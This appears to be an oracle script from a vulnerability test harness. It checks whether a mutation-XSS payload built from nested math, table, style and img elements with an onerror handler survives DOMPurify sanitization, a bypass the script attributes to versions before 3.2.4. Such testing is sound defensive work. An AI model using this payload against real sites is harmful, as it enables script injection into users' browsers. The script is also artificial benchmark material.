'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function buildWindow() {
  // Minimal DOM shim sufficient for DOMPurify to initialize and sanitize
  // simple HTML strings without requiring jsdom as an external dependency.
  // We only need enough DOM surface for DOMPurify's feature detection and
  // basic parsing/serialization via DOMParser-like behavior is actually
  // provided internally by DOMPurify when given a 'window' with a document
  // created via document.implementation.createHTMLDocument. Node's built-in
  // modules do not provide a DOM, so instead we try to use the global
  // document if present (jsdom-based test runner), and otherwise fall back
  // to requiring the 'jsdom' package only if it is already resolvable as a
  // transitive dependency of dompurify itself (not a direct require of an
  // unrelated package). If neither is available, we cannot proceed.
  try {
    // Try resolving jsdom via dompurify's own dependency resolution chain.
    const dompurifyMain = require.resolve('dompurify');
    const dompurifyDir = path.dirname(dompurifyMain);
    const jsdomPath = require.resolve('jsdom', { paths: [dompurifyDir, process.cwd()] });
    const { JSDOM } = require(jsdomPath);
    const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
    return dom.window;
  } catch (e) {
    return null;
  }
}

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const createDOMPurify = require('dompurify');

    const window = buildWindow();
    if (!window) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'No DOM window available for DOMPurify setup'
      }));
      return;
    }

    const DOMPurify = createDOMPurify(window);

    const marker = 'dp_marker_' + Math.random().toString(36).slice(2);

    // Benign input first: prove basic sanitization works correctly.
    const benignInput = '<p id="' + marker + '">Hello <b>world</b></p><script>alert(1)<\/script>';
    const benignResult = DOMPurify.sanitize(benignInput);

    const benignOk =
      typeof benignResult === 'string' &&
      benignResult.indexOf(marker) !== -1 &&
      benignResult.indexOf('<script') === -1 &&
      benignResult.indexOf('<b>world</b>') !== -1;

    if (!benignOk) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign sanitize call did not behave as expected: ' + benignResult
      }));
      return;
    }

    operation_completed = true;

    // Malicious input: mutation-XSS style payload using nested math/style/img
    // constructs known to bypass sanitization in DOMPurify < 3.2.4
    // (GHSA-mjjr-9g6f-9j9h style template/namespace confusion issue).
    const xssMarker = 'XSS_' + marker;
    const maliciousInput =
      '<math><mtext><table><mglyph><style><img src=x onerror="window.__' +
      xssMarker +
      '__=true">';

    let maliciousResult;
    try {
      maliciousResult = DOMPurify.sanitize(maliciousInput);
    } catch (innerErr) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious sanitize call threw: ' + String(innerErr && innerErr.message)
      }));
      return;
    }

    const containsDangerousHandler =
      typeof maliciousResult === 'string' &&
      /onerror\s*=/i.test(maliciousResult) &&
      maliciousResult.indexOf(xssMarker) !== -1;

    exploit_succeeded = containsDangerousHandler;

    evidence = exploit_succeeded
      ? 'Malicious payload survived sanitization, dangerous onerror handler present: ' + maliciousResult
      : 'Malicious payload was properly sanitized: ' + maliciousResult;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.stack ? err.stack : err)
    }));
  }
}

main();
